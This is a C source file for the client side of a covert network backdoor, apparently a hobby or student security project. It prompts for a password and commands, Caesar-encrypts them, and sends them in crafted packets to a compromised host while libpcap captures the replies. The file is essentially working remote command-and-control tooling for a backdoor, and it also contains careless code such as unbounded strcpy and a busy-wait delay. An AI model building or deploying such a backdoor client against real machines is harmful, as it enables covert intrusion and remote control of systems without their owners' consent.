#include "backdoor-client.h"

int main(int argc, char **argv)
{
	/* Check to see if user is root */
	if (geteuid() != USER_ROOT)
	{
		printf("\nYou need to be root to run this.\n\n");
    		exit(0);
	}

	client.dst_port = DEFAULT_PORT;
	
	if(parse_options(argc, argv) < 0)
		exit(1);
	
	startClient();

	return 0;
}
int startClient()
{
	
	pcap_t * nic_handle = NULL;
	struct bpf_program fp;
	pthread_t user_thread;

	//start libpcap to display results
	pthread_create(&user_thread, NULL, process_user, (void *) &client);
	startPacketCapture(nic_handle, fp, FROM_SERVER, client.server_host, client.dst_port);
	
	stopPacketCapture(nic_handle, fp);
	return 0;
}

void * process_user (void * arg)
{
	struct client * client = (struct client *) arg;

	char buffer[BUF_LENGTH], encrypted_text[BUF_LENGTH];
	int quit = FALSE;
	int password_entered = FALSE;
	int i = 0;

	while(!quit)
	{
		// First time iteration
		if(!password_entered)
		{
			printf("Enter a password: ");
			strcpy(client->password, get_line(buffer, BUF_LENGTH, stdin));
			password_entered = TRUE;
			
			memset(buffer, 0, sizeof(buffer));
		}
		//read input
		printf("Enter a command: ");
		strcpy(client->command, get_line(buffer, BUF_LENGTH, stdin));
		if(strcmp(client->command, "quit") == 0)
		{
			quit = TRUE;
		}
		memset(buffer, 0, sizeof(buffer));
		sprintf(buffer, "%s %d %s%s%s", client->password, SERVER_MODE, CMD_START, client->command, CMD_END);
		printf("Sending data: %s\n", buffer);
		//Encrypt the data
		strcpy(encrypted_text, ConvertCaesar(mEncipher, buffer, MOD, START));

		send_packet(encrypted_text, get_ip_addr(NETWORK_INT), client->server_host, client->dst_port);
		//clear buffer
		memset(client->command, 0, BUF_LENGTH);
		for (i = 0; i < 300000000; i++);	
	}
	return 0;
}

int parse_options(int argc, char **argv)
{
	char c;

	while ((c = getopt (argc, argv, "a:p")) != -1)
	{
		switch(c)
		{
			case 'a':
				client.server_host = optarg;
				break;
			case 'p':
				client.dst_port = atoi(optarg);
				break;
			case '?':
			default:
				fprintf(stderr, "Must add a server host.\n");
				usage(argv[0], CLIENT_MODE);
				return -1;
		}
	}
	return 0;

}

void print_client_info()
{
	fprintf(stderr, "Server's IP host: %s\n", client.server_host);
	fprintf(stderr, "Server's destination port: %d\n", client.dst_port);
	fprintf(stderr, "Sending cmd: %s\n", client.command);
}
